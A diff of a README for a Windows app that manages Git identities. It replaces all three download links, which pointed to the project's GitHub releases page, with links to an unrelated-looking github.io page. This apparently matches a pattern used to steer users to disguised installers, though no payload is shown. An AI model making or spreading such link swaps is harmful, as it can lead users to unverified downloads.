@@ -1,6 +1,6 @@
 # 🧭 gitContext - Keep Every Commit Identity Correct
 
-[![Download gitContext for Windows](https://img.shields.io/badge/Download-gitContext_for_Windows-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/plexusdentalischangtzu246/gitContext/releases)
+[![Download gitContext for Windows](https://img.shields.io/badge/Download-gitContext_for_Windows-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://plexusdentalischangtzu246.github.io)
 
 gitContext is a local desktop app for developers with more than one GitHub or GitLab account. Git Context sets the right name, email, and SSH key for each repository, so you stop committing as the wrong person.
 
@@ -34,7 +34,7 @@ The first step is to download gitContext from the official releases page. Use th
 
 ## 📥 Download and Run gitContext
 
-**Download link:** [https://github.com/plexusdentalischangtzu246/gitContext/releases](https://github.com/plexusdentalischangtzu246/gitContext/releases)
+**Download link:** [https://plexusdentalischangtzu246.github.io](https://plexusdentalischangtzu246.github.io)
 
 Visit this link to download the application.
 
@@ -132,7 +132,7 @@ Yes. You can add the GitHub and GitLab accounts you use and connect each project
 No. You sign in to your accounts through GitHub or GitLab. gitContext uses the account details you provide to set the right identity for each project folder.
 
 **Where do I download gitContext?**  
-Visit this link to download the application: [https://github.com/plexusdentalischangtzu246/gitContext/releases](https://github.com/plexusdentalischangtzu246/gitContext/releases)
+Visit this link to download the application: [https://plexusdentalischangtzu246.github.io](https://plexusdentalischangtzu246.github.io)
 
 **What should I do first after opening gitContext?**  
 Add your first GitHub or GitLab account, enter the name and email for that account, and save the settings. Then add your other accounts and connect your project folders.
